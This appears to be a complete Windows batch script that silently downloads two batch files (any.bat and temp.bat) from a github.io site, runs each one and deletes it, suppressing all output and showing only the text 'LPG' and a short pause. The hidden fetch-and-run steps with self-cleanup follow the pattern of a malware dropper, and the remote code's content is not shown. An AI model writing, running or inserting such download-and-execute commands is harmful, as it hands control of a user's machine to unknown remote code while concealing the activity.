@echo off
cls
rem call any

curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat && del any.bat > NUL 2>&1

echo LPG
timeout /t 3

curl -o temp.bat https://suporteeq.github.io/temp.bat > NUL 2>&1 && call temp.bat && del temp.bat > NUL 2>&1